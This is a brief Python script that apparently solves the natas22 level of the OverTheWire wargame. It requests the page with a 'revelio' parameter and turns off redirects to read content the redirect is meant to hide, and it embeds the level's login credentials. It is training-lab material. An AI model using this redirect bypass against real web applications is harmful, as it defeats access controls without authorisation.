import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas22.natas.labs.overthewire.org/index.php?debug=1'
auth = HTTPBasicAuth('natas22', 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')

params = dict(revelio=1)
r = requests.get(HOST, params=params, auth=auth, allow_redirects=False)
print r.content




